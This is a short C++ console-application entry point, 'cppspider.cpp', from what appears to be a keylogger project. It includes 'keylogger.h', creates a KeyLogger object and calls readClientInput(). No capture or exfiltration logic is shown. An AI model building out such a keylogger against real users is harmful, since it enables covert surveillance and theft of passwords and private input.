// cppspider.cpp : Définit le point d'entrée pour l'application console.
//

#include "stdafx.h"
#include "keylogger.h"


int				main(int argc, char **argv)
{
	KeyLogger	keyLogger(argc, argv);

	keyLogger.readClientInput();
    return (0);
}

